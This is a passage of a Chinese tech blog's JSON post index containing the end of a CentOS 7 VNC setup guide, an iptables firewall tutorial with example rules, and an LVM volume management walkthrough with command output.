/home/fwj/.vnc/localhost.localdomain:1.log然后设置开机启动，并且启动进程 [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl enable vncserver@:1.service Created symlink from /etc/systemd/system/multi-user.target.wants/vncserver@:1.service to /etc/systemd/system/vncserver@:1.service. [root@localhost ~]# systemctl start vncserver@:1.service这里最好重启下 [root@localhost ~]#reboot然后 [root@localhost ~]# systemctl status vncserver@\\:1.service ● vncserver@:1.service - Remote desktop service (VNC) Loaded: loaded (/etc/systemd/system/vncserver@:1.service; enabled; vendor preset: disabled) Active: active (running) since Mon 2017-04-24 19:55:03 CST; 56s ago Process: 8411 ExecStart=/usr/sbin/runuser -l fwj -c /usr/bin/vncserver %i (code=exited, status=0/SUCCESS) Process: 8400 ExecStartPre=/bin/sh -c /usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || : (code=exited, status=0/SUCCESS) Main PID: 7647 (Xvnc) CGroup: /system.slice/system-vncserver.slice/vncserver@:1.service ‣ 7647 /bin/Xvnc :1 -desktop localhost.localdomain:1 (fwj) -auth /home/fwj/.Xauthority -geometry 1024... Apr 24 19:55:00 localhost.localdomain systemd[1]: Starting Remote desktop service (VNC)... Apr 24 19:55:03 localhost.localdomain systemd[1]: Started Remote desktop service (VNC).连接1.使用 vnc chrome 的插件 2.远程桌面 通过图形界面安装 虚拟机都还好，不是特别卡（局域网内） 本文参考https://www.howtoforge.com/vnc-server-installation-on-centos-7 配置","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 防火墙之 iptables","slug":"Linux-防火墙之-iptables","date":"2017-06-14T07:24:05.000Z","updated":"2021-02-26T06:05:29.258Z","comments":true,"path":"posts/737978815.html","link":"","permalink":"https://awen.me/posts/737978815.html","excerpt":"防火墙的种类有很多，比如我们的长城防火墙，Windows 的防火墙，linux 的防火墙，以及一些专业的防火墙硬件。防火墙的目的是用来阻止或允许数据包的接收和发送。下面我们就来聊一聊 linux 的防火墙 iptables，另外在 centos7 中默认采用 firewalld 做为系统默认的防火墙，但是，其底层都是基于内核级的 netfilter 实现的。","text":"防火墙的种类有很多，比如我们的长城防火墙，Windows 的防火墙，linux 的防火墙，以及一些专业的防火墙硬件。防火墙的目的是用来阻止或允许数据包的接收和发送。下面我们就来聊一聊 linux 的防火墙 iptables，另外在 centos7 中默认采用 firewalld 做为系统默认的防火墙，但是，其底层都是基于内核级的 netfilter 实现的。 iptables简介netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 iptables基础规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息 包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规 则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的 主要工作就是添加、修改和删除这些规则。 iptables和netfilter的关系：这是第一个要说的地方，Iptables和netfilter的关系是一个很容易让人搞不清的问题。很多的知道iptables却不知道 netfilter。其实iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是 netfilter，它是Linux内核中实现包过滤的内部结构。 iptables传输数据包的过程① 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。② 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。③ 如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。 iptables的规则表和链表（tables）提供特定的功能，iptables内置了4个表，即filter表、nat表、mangle表和raw表，分别用于实现包过滤，网络地址转换、包重构(修改)和数据跟踪处理。 链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一 条或数条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据 该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定 义的默认策略来处理数据包。 Iptables采用“表”和“链”的分层结构。在REHL4中是三张表五个链。现在REHL5成了四张表五个链了，不过多出来的那个表用的也不太多，所以基本还是和以前一样。下面罗列一下这四张表和五个链。注意一定要明白这些表和链的关系及作用。 规则表1.filter表——三个链：INPUT、FORWARD、OUTPUT作用：过滤数据包 内核模块：iptables_filter.2.Nat表——三个链：PREROUTING、POSTROUTING、OUTPUT作用：用于网络地址转换（IP、端口） 内核模块：iptable_nat3.Mangle表——五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD作用：修改数据包的服务类型、TTL、并且可以配置路由实现QOS内核模块：iptable_mangle(别看这个表这么麻烦，咱们设置策略时几乎都不会用到它)4.Raw表——两个链：OUTPUT、PREROUTING作用：决定数据包是否被状态跟踪机制处理 内核模块：iptable_raw 规则链 INPUT——进来的数据包应用此规则链中的策略 OUTPUT——外出的数据包应用此规则链中的策略 FORWARD——转发数据包时应用此规则链中的策略 PREROUTING——对数据包作路由选择前应用此链中的规则（所有的数据包进来的时侯都先由这个链处理） POSTROUTING——对数据包作路由选择后应用此链中的规则（所有的数据包出来的时侯都先由这个链处理） 规则表之间的优先顺序Raw——mangle——nat——filter规则链之间的优先顺序（分三种情况）： 入站数据流向 从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等），之后会进行路由选择（判断该数据包应该发往何处），如果数据包 的目标主机是防火墙本机（比如说Internet用户访问防火墙主机中的web服务器的数据包），那么内核将其传给INPUT链进行处理（决定是否允许通 过等），通过以后再交给系统上层的应用程序（比如Apache服务器）进行响应。 转发数据流向 来自外界的数据包到达防火墙后，首先被PREROUTING规则链处理，之后会进行路由选择，如果数据包的目标地址是其它外部地址（比如局域网用户通过网 关访问QQ站点的数据包），则内核将其传递给FORWARD链进行处理（是否转发或拦截），然后再交给POSTROUTING规则链（是否修改数据包的地 址等）进行处理。 出站数据流向防火墙本机向外部地址发送的数据包（比如在防火墙主机中测试公网DNS服务器时），首先被OUTPUT规则链处理，之后进行路由选择，然后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 iptables的基本语法格式iptables [-t 表名] 命令选项 ［链名］ ［条件匹配］ ［-j 目标动作或跳转］说明：表名、链名用于指定 iptables命令所操作的表和链，命令选项用于指定管理iptables规则的方式（比如：插入、增加、删除、查看等；条件匹配用于指定对符合什么样 条件的数据包进行处理；目标动作或跳转用于指定数据包的处理方式（比如允许通过、拒绝、丢弃、跳转（Jump）给其它链处理。 选项-A 在指定链的末尾添加（append）一条新的规则-D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除-I 在指定链中插入（insert）一条新的规则，默认在第一行添加-R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换-L 列出（list）指定链中所有的规则进行查看-E 重命名用户定义的链，不改变链本身-F 清空（flush）-N 新建（new-chain）一条用户自己定义的规则链-X 删除指定表中用户自定义的规则链（delete-chain）-P 设置指定链的默认策略（policy）-Z 将所有表的所有链的字节和数据包计数器清零-n 使用数字形式（numeric）显示输出结果-v 查看规则表详细信息（verbose）的信息-V 查看版本(version)-h 获取帮助（help） 防火墙处理数据包的四种方式ACCEPT 允许数据包通过DROP 直接丢弃数据包，不给任何回应信息REJECT 拒绝数据包通过，必要时会给数据发送端一个响应的信息。LOG在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 centos 7 使用 iptables1.关闭 firewalld [root@localhost ~]# systemctl disable firewalld.service #关闭 Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service. Removed symlink /etc/systemd/system/basic.target.wants/firewalld.service. [root@localhost ~]# systemctl stop firewalld.service #停止 [root@localhost ~]# systemctl mask firewalld.service #如果一个服务很关键，常态必须为关闭状态，如果不希望该服务被随意启动。但是disable后可能还会有人尝试去手工启动，或该服务被其他服务调用而启动，那么这时我们需要用mask来禁用该服务。 Created symlink from /etc/systemd/system/firewalld.service to /dev/null.查看 [root@adsl-172-10-100-130 ~]# systemctl list-unit-files | grep firew* firewalld.service masked 2.安装 iptables 服务 yum install iptables-services 3.启动 [root@localhost ~]# systemctl enable iptables.service Created symlink from /etc/systemd/system/basic.target.wants/iptables.service to /usr/lib/systemd/system/iptables.service. [root@localhost ~]# systemctl start iptables.service4.清空规则 [root@localhost ~]# iptables -F #清除预设表filter中的所有规则链的规则 [root@localhost ~]# iptables -X #删除表中的所有非内建的链。 [root@localhost ~]# iptables -Z # 将所有链中的数据包和字节计数器归零注意，清空规则后，一定要先保存下，否则当你做其他操作后在保存，旧的规则又会被写入进配置文件 [root@localhost ~]# iptables-save # Generated by iptables-save v1.4.21 on Tue May 9 14:32:06 2017 *filter :INPUT ACCEPT [78:5224] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [46:3900] COMMIT # Completed on Tue May 9 14:32:06 2017查看规则 [root@localhost ~]# iptables -L Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination4.查看手册 [root@localhost ~]# man iptables5.允许22端口通行 [root@localhost ~]# iptables -A INPUT -p tcp --dport 22 -j ACCEPT6.允许80，443端口通行 [root@localhost ~]# iptables -A INPUT -p tcp --dport 80 -j ACCEPT [root@localhost ~]# iptables -A INPUT -p tcp --dport 443 -j ACCEPT7.直接shell 上执行的命令都是临时性的，重启后就失效了，所以需要将临时的规则保存 [root@localhost ~]# iptables-save # Generated by iptables-save v1.4.21 on Tue May 9 14:35:43 2017 *filter :INPUT ACCEPT [1637:3240196] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [1930:147377] -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT COMMIT # Completed on Tue May 9 14:35:43 2017 [root@localhost ~]# iptables -L -n Chain INPUT (policy ACCEPT) target prot opt source destination ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:22 ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:443 Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination8.设置预设规则 [root@localhost ~]# iptables -P INPUT DROP[root@localhost ~]# iptables -P OUTPUT ACCEPT[root@localhost ~]# iptables -P FORWARD DROP 上面的意思是,当超出了IPTABLES里filter表里的两个链规则(INPUT,FORWARD)时,不在这两个规则里的数据包怎么处理呢,那就是DROP(放弃).应该说这样配置是很安全的.我们要控制流入数据包而对于OUTPUT链,也就是流出的包我们不用做太多限制,而是采取ACCEPT,也就是说,不在着个规则里的包怎么办呢,那就是通过。 9.允许 dns 服务 下面的表示允许 tcp dport[目标端口] 53的 数据包以及 udp sport[源端口] 53 的数据包通行。 [root@localhost ~]# iptables -A INPUT -p tcp --dport 53 -j ACCEPT [root@localhost ~]# iptables -A INPUT -p udp --dport 53 -j ACCEPT [root@localhost ~]# iptables -A INPUT -p udp --sport 53 -j ACCEPT [root@localhost ~]# iptables -A INPUT -p tcp --sport 53 -j ACCEPT 10.拒绝ftp 服务 [root@localhost ~]# iptables -A INPUT -p tcp –dport 21 -j DROP 12.允许 icmp [root@localhost ~]# iptables -A INPUT -p icmp -j ACCEPT12.允许192.168.50.0/24的网段连接 [root@localhost ~]# iptables -A INPUT -s 192.168.50.0/24 -j ACCEPT13.允许指定网段连接指定端口，可以通过-s 参数指定网段 [root@localhost ~]# iptables -A INPUT -s 192.168.51.0/24 -p tcp --dport 65422 -j ACCEPT 指定某个网卡接口，可以通过-i 参数 后面跟上接口名称 [root@localhost ~]# iptables -A INPUT -i ens33 -p tcp –dport 3306 -j ACCEPT 15.允许指定的端口范围 [root@localhost ~]# iptables -A INPUT -p tcp --dport 65400:65411 -j ACCEPT 16.禁止转发某个 mac 地址的主机的数据包 [root@localhost ~]# iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP 18.禁止多个不连续的端口 [root@localhost ~]# iptables -A INPUT -p tcp -m multiport --dport 20,23,25,119 -j DROP 说明：这里用“-m multiport –dport”来指定目的端口及范围 19.禁止转发与正常TCP连接无关的非—syn请求数据包 [root@localhost ~]# iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP 20.拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包 [root@localhost ~]# iptables -A INPUT -p tcp -m state --state NEW -j DROP [root@localhost ~]# iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包，“RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。 21.禁止转发源IP地址为192.168.0.1-192.168.0.20的TCP数据包。 [root@localhost ~]# iptables -A FORWARD -p tcp -m iprange –src-range 192.160.0.1-192.168.0.20 -j DROP 说明：此处用“-m –iprange –src-range”指定IP范围。 22.删除 INPUT 链的第二条规则 [root@localhost ~]# iptables -D INPUT 2 23.封堵某个网段，2小时候解封 # iptables -I INPUT -s 10.20.30.0/24 -j DROP # iptables -I FORWARD -s 10.20.30.0/24 -j DROP # at now 2 hours at&gt; iptables -D INPUT 1 at&gt; iptables -D FORWARD 1 3.端口转发,当任何请求到达65426端口时 将请求转发到80端口 # iptables -t nat -A PREROUTING -s 0.0.0.0/0 -p tcp --dport 65426 -j DNAT --to-destination :80","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"Linux 使用lvm 管理磁盘","slug":"Linux-使用lvm-管理磁盘","date":"2017-06-14T07:22:11.000Z","updated":"2021-02-26T06:05:29.254Z","comments":true,"path":"posts/1877290567.html","link":"","permalink":"https://awen.me/posts/1877290567.html","excerpt":"创建和查看 PV1.创建 pv [root@localhost opt]# pvcreate /dev/sdb{1,2,3,4} WARNING: dos signature detected on /dev/sdb1 at offset 510. Wipe it? [y/n]: y Wiping dos signature on /dev/sdb1. Physical volume &quot;/dev/sdb1&quot; successfully created. Physical volume &quot;/dev/sdb2&quot; successfully created. Physical volume &quot;/dev/sdb3&quot; successfully created. Physical volume &quot;/dev/sdb4&quot; successfully created.","text":"创建和查看 PV1.创建 pv [root@localhost opt]# pvcreate /dev/sdb{1,2,3,4} WARNING: dos signature detected on /dev/sdb1 at offset 510. Wipe it? [y/n]: y Wiping dos signature on /dev/sdb1. Physical volume &quot;/dev/sdb1&quot; successfully created. Physical volume &quot;/dev/sdb2&quot; successfully created. Physical volume &quot;/dev/sdb3&quot; successfully created. Physical volume &quot;/dev/sdb4&quot; successfully created. 2.查看 pv [root@localhost opt]# pvs PV VG Fmt Attr PSize PFree /dev/sda2 cl lvm2 a-- 19.00g 0 /dev/sdb1 lvm2 --- 5.00g 5.00g /dev/sdb2 lvm2 --- 5.00g 5.00g /dev/sdb3 lvm2 --- 5.00g 5.00g /dev/sdb4 lvm2 --- 5.00g 5.00g3.查看详细信息 [root@localhost opt]# pvdisplay --- Physical volume --- PV Name /dev/sda2 VG Name cl PV Size 19.00 GiB / not usable 3.00 MiB Allocatable yes (but full) PE Size 4.00 MiB Total PE 4863 Free PE 0 Allocated PE 4863 PV UUID X5WbXW-4qUV-MoYO-1ws3-3y6J-36tz-M5CxPM &quot;/dev/sdb1&quot; is a new physical volume of &quot;5.00 GiB&quot; --- NEW Physical volume --- PV Name /dev/sdb1 VG Name PV Size 5.00 GiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID emcwLR-IKkM-9R2G-1rEF-y94t-GLrT-SGk2Qk &quot;/dev/sdb3&quot; is a new physical volume of &quot;5.00 GiB&quot; --- NEW Physical volume --- PV Name /dev/sdb3 VG Name PV Size 5.00 GiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID 6gwwXq-vzJD-wxOY-ACAj-mvTI-wyh5-AAZRdp &quot;/dev/sdb2&quot; is a new physical volume of &quot;5.00 GiB&quot; --- NEW Physical volume --- PV Name /dev/sdb2 VG Name PV Size 5.00 GiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID btswJD-I59p-xxWQ-VyLr-Gobc-rVdJ-MqupEG &quot;/dev/sdb4&quot; is a new physical volume of &quot;5.00 GiB&quot; --- NEW Physical volume --- PV Name /dev/sdb4 VG Name PV Size 5.00 GiB Allocatable NO PE Size 0 Total PE 0 Free PE 0 Allocated PE 0 PV UUID RSP9tx-kWci-Yc9r-P6HF-yUxZ-p3ck-h2oM9g这里主要观察 PE Size，可以看到是0 创建 vg1.创建 vg，并且使用-s参数指定 PE 的大小 [root@localhost opt]# vgcreate -s 8M myvg /dev/sdb{1,2,3,4} Volume group &quot;myvg&quot; successfully created2.使用 pvs 查看基本信息 [root@localhost opt]# pvs PV VG Fmt Attr PSize PFree /dev/sda2 cl lvm2 a-- 19.00g 0 /dev/sdb1 myvg lvm2 a-- 4.99g 4.99g /dev/sdb2 myvg lvm2 a-- 4.99g 4.99g /dev/sdb3 myvg lvm2 a-- 4.99g 4.99g /dev/sdb4 myvg lvm2 a-- 4.99g 4.99g3.查看详细信息 [root@localhost opt]# pvdisplay --- Physical volume --- PV Name /dev/sdb1 VG Name myvg PV Size 5.00 GiB / not usable 8.00 MiB Allocatable yes PE Size 8.00 MiB Total PE 639 Free PE 639 Allocated PE 0 PV UUID emcwLR-IKkM-9R2G-1rEF-y94t-GLrT-SGk2Qk --- Physical volume --- PV Name /dev/sdb2 VG Name myvg PV Size 5.00 GiB / not usable 8.00 MiB Allocatable yes PE Size 8.00 MiB Total PE 639 Free PE 639 Allocated PE 0 PV UUID btswJD-I59p-xxWQ-VyLr-Gobc-rVdJ-MqupEG --- Physical volume --- PV Name /dev/sdb3 VG Name myvg PV Size 5.00 GiB / not usable 8.00 MiB Allocatable yes PE Size 8.00 MiB Total PE 639 Free PE 639 Allocated PE 0 PV UUID 6gwwXq-vzJD-wxOY-ACAj-mvTI-wyh5-AAZRdp --- Physical volume --- PV Name /dev/sdb4 VG Name myvg PV Size 5.00 GiB / not usable 6.98 MiB Allocatable yes PE Size 8.00 MiB Total PE 639 Free PE 639 Allocated PE 0 PV UUID RSP9tx-kWci-Yc9r-P6HF-yUxZ-p3ck-h2oM9g --- Physical volume --- PV Name /dev/sda2 VG Name cl PV Size 19.00 GiB / not usable 3.00 MiB Allocatable yes (but full) PE Size 4.00 MiB Total PE 4863 Free PE 0 Allocated PE 4863 PV UUID X5WbXW-4qUV-MoYO-1ws3-3y6J-36tz-M5CxPM4.查看指定设备 [root@localhost opt]# pvdisplay /dev/sdb3 --- Physical volume --- PV Name /dev/sdb3 VG Name myvg PV Size 5.00 GiB / not usable 8.00 MiB Allocatable yes PE Size 8.00 MiB Total PE 639 Free PE 639 Allocated PE 0 PV UUID 6gwwXq-vzJD-wxOY-ACAj-mvTI-wyh5-AAZRdp创建和使用 lv1.创建 lv，名称为 linux，大小为5g 从刚才创建的 myvg 卷组中拿出5g 的大小创建逻辑卷。 [root@localhost opt]# lvcreate -L 5G -n linux myvg WARNING: LVM2_member signature detected on /dev/myvg/linux at offset 536. Wipe it? [y/n]: y Wiping LVM2_member signature on /dev/myvg/linux. Logical volume &quot;linux&quot; created.2.查看基本信息 [root@localhost opt]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-a----- 5.00g3.查看详细信息 [root@localhost opt]# lvdisplay --- Logical volume --- LV Path /dev/myvg/linux LV Name linux VG Name myvg LV UUID 1OmSKi-VHPj-Tbnb-P4IV-2hAQ-u4Il-hc1yl2 LV Write Access read/write LV Creation host, time localhost.localdomain, 2017-04-22 10:49:03 +0800 LV Status available # open 0 LV Size 5.00 GiB Current LE 640 Segments 2 Allocation inherit Read ahead sectors auto - currently set to 8192 Block device 253:2 --- Logical volume --- LV Path /dev/cl/swap LV Name swap VG Name cl LV UUID gQsXBL-tMOS-fzaJ-9Rml-U3mv-ubAF-XNc5og LV Write Access read/write LV Creation host, time localhost.localdomain, 2017-04-18 09:42:07 +0800 LV Status available # open 2 LV Size 2.00 GiB Current LE 512 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 8192 Block device 253:1 --- Logical volume --- LV Path /dev/cl/root LV Name root VG Name cl LV UUID tYWq97-Irfv-N3bk-ilqa-SSMH-lZij-G7M9ey LV Write Access read/write LV Creation host, time localhost.localdomain, 2017-04-18 09:42:07 +0800 LV Status available # open 1 LV Size 17.00 GiB Current LE 4351 Segments 1 Allocation inherit Read ahead sectors auto - currently set to 8192 Block device 253:04.指定设备查看 [root@localhost opt]# lvdisplay /dev/myvg/linux --- Logical volume --- LV Path /dev/myvg/linux LV Name linux VG Name myvg LV UUID 1OmSKi-VHPj-Tbnb-P4IV-2hAQ-u4Il-hc1yl2 LV Write Access read/write LV Creation host, time localhost.localdomain, 2017-04-22 10:49:03 +0800 LV Status available # open 0 LV Size 5.00 GiB Current LE 640 Segments 2 Allocation inherit Read ahead sectors auto - currently set to 8192 Block device 253:2使用创建的 lv1.格式化 [root@localhost opt]# mkfs.xfs /dev/ Display all 177 possibilities? (y or n) [root@localhost opt]# mkfs.xfs /dev/myvg/linux meta-data=/dev/myvg/linux isize=512 agcount=4, agsize=327680 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0 data = bsize=4096 blocks=1310720, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal log bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=02.挂载 [root@localhost opt]# mkdir /data [root@localhost opt]# mount /dev/myvg/linux /data/ [root@localhost opt]# cd /data/ [root@localhost data]# ls增加容量lvm 支持在线缩小。 1.先查看 lv 大小 [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 5.00g2.然后增加5g [root@localhost data]# lvextend -L +5G /dev/myvg/linux Size of logical volume myvg/linux changed from 5.00 GiB (640 extents) to 10.00 GiB (1280 extents). Logical volume myvg/linux successfully resized. [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 10.00g3.查看增加后的容量 [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 10.00g使用lvresize 增加 lv 大小1.查看目前的 lvs 大小 [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 5.00g lv1 myvg -wi-ao---- 11.00g2.目前11g,增加到12g,这里的-L 后大小一定要比当前的大小大，否则则是缩小逻辑卷的大小，另外也可以使用+来增加。 [root@localhost data]# lvresize -L 12G /dev/myvg/lv1 Size of logical volume myvg/lv1 changed from 11.00 GiB (2816 extents) to 12.00 GiB (3072 extents). Logical volume myvg/lv1 successfully resized. 3.查看 lvs 大小。 [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 5.00g lv1 myvg -wi-ao---- 12.00g 4.查看目前挂载的目录，发现还是11G [root@localhost data]# df -h /ext4/ Filesystem Size Used Avail Use% Mounted on /dev/mapper/myvg-lv1 11G 25M 11G 1% /ext4 5.使用resize2fs 刷新磁盘 [root@localhost data]# resize2fs /dev/myvg/lv1 resize2fs 1.42.9 (28-Dec-2013) Filesystem at /dev/myvg/lv1 is mounted on /ext4; on-line resizing required old_desc_blocks = 2, new_desc_blocks = 2 The filesystem on /dev/myvg/lv1 is now 3145728 blocks long.6.再次查看 [root@localhost data]# df -h /ext4/ Filesystem Size Used Avail Use% Mounted on /dev/mapper/myvg-lv1 12G 25M 12G 1% /ext4 增加后一定要使用resize2fs 刷新磁盘，否则容量不正确。 减小容量1.查看容量 [root@localhost data]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g linux myvg -wi-ao---- 10.00g2.减小容量 注意：缩小容量前一定要先卸载对应的逻辑卷 先查看 [root@localhost /]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g lv_xfs myvg -wi-a----- 7.00g mylv1 myvg -wi-ao---- 5.00g查看挂载的容量 [root@localhost /]# df -h /mnt/data Filesystem Size Used Avail Use% Mounted on /dev/mapper/myvg-mylv1 4.8G 20M 4.6G 1% /mnt/data先缩小文件系统的大小，提示需要先 umount [root@localhost /]# resize2fs /dev/myvg/mylv1 400M resize2fs 1.42.9 (28-Dec-2013) Filesystem at /dev/myvg/mylv1 is mounted on /mnt/data; on-line resizing required resize2fs: On-line shrinking not supported取消挂载 [root@localhost /]# umount /mnt/data再次运行刚才的命令，提示需要运行 e2fsck -f /dev/myvg/mylv1 [root@localhost /]# resize2fs /dev/myvg/mylv1 400M resize2fs 1.42.9 (28-Dec-2013) Please run &apos;e2fsck -f /dev/myvg/mylv1&apos; first.执行e2fsck -f /dev/myvg/mylv1 [root@localhost /]# e2fsck -f /dev/myvg/mylv1 e2fsck 1.42.9 (28-Dec-2013) Pass 1: Checking inodes, blocks, and sizes Pass 2: Checking directory structure Pass 3: Checking directory connectivity Pass 4: Checking reference counts Pass 5: Checking group summary information /dev/myvg/mylv1: 11/327680 files (0.0% non-contiguous), 58462/1310720 blocks再次执行刚才的命令 [root@localhost /]# resize2fs /dev/myvg/mylv1 400M resize2fs 1.42.9 (28-Dec-2013) Resizing the filesystem on /dev/myvg/mylv1 to 102400 (4k) blocks. The filesystem on /dev/myvg/mylv1 is now 102400 blocks long. OK，成功了，然后在缩小逻辑卷 [root@localhost /]# lvresize -L 400M /dev/myvg/mylv1 WARNING: Reducing active logical volume to 400.00 MiB. THIS MAY DESTROY YOUR DATA (filesystem etc.) Do you really want to reduce myvg/mylv1? [y/n]: y Size of logical volume myvg/mylv1 changed from 5.00 GiB (1280 extents) to 400.00 MiB (100 extents). Logical volume myvg/mylv1 successfully resized.查看 lv 的大小，已经是400M 了 [root@localhost /]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g lv_xfs myvg -wi-a----- 7.00g mylv1 myvg -wi-a----- 400.00m重新挂载 [root@localhost /]# mount /dev/myvg/mylv1 /mnt/data 查看挂载后的大小，一切正常 [root@localhost /]# df -h /mnt/data Filesystem Size Used Avail Use% Mounted on /dev/mapper/myvg-mylv1 264M 7.6M 229M 4% /mnt/data4.xfs 格式扩容或减小挂载出错 [root@localhost /]# resize2fs /dev/myvg/lv_xfs resize2fs 1.42.9 (28-Dec-2013) resize2fs: Bad magic number in super-block while trying to open /dev/myvg/lv_xfs Couldn&apos;t find valid filesystem superblock. #xfs 格式需要使用 xfs_growfs命令 [root@localhost /]# xfs_growfs /dev/myvg/lv_xfs meta-data=/dev/mapper/myvg-lv_xfs isize=512 agcount=4, agsize=327680 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0 spinodes=0 data = bsize=4096 blocks=1310720, imaxpct=25 = sunit=0 swidth=0 blks naming =version 2 bsize=4096 ascii-ci=0 ftype=1 log =internal bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1 realtime =none extsz=4096 blocks=0, rtextents=0 data blocks changed from 1310720 to 1835008 [root@localhost /]# clear [root@localhost /]# df -h /mnt/data1/ Filesystem Size Used Avail Use% Mounted on /dev/mapper/myvg-lv_xfs 7.0G 33M 7.0G 1% /mnt/data1 [root@localhost /]#删除删除的顺序是先 lv–&gt; vg —&gt; pv 的顺序 删除 lv1.先卸载 [root@localhost /]# umount /dev/myvg/linux2.删除 lv [root@localhost /]# lvremove /dev/myvg/linux Do you really want to remove active logical volume myvg/linux? [y/n]: y Logical volume &quot;linux&quot; successfully removed3.查看 lv [root@localhost /]# lvs LV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert root cl -wi-ao---- 17.00g swap cl -wi-ao---- 2.00g删除 vg1.删除 vg [root@localhost /]# vgremove myvg Volume group &quot;myvg&quot; successfully removed2.查看 vg [root@localhost /]# vgs VG #PV #LV #SN Attr VSize VFree cl 1 2 0 wz--n- 19.00g 0删除 pv1.删除 pv [root@localhost /]# pvremove /dev/sdb{1,2,3,4} Labels on physical volume &quot;/dev/sdb1&quot; successfully wiped. Labels on physical volume &quot;/dev/sdb2&quot; successfully wiped. Labels on physical volume &quot;/dev/sdb3&quot; successfully wiped. Labels on physical volume &quot;/dev/sdb4&quot; successfully wiped.2.查看 pv [root@localhost /]# pvs PV VG Fmt Attr PSize PFree /dev/sda2 cl lvm2 a-- 19.00g 0扩充 